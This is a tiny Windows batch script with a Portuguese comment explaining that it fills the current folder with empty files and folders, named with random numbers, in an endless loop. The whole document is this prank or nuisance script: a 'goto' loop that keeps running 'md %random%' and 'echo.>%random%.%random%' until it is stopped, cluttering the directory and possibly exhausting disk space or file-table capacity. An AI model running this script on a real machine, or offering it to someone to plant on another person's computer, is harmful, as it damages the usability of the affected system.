:: Enche a pasta atual de arquivos e pastas vazias infinitamente(com nomes numericos aleatorios)

:loop
md %random%
echo.>%random%.%random%
goto :loop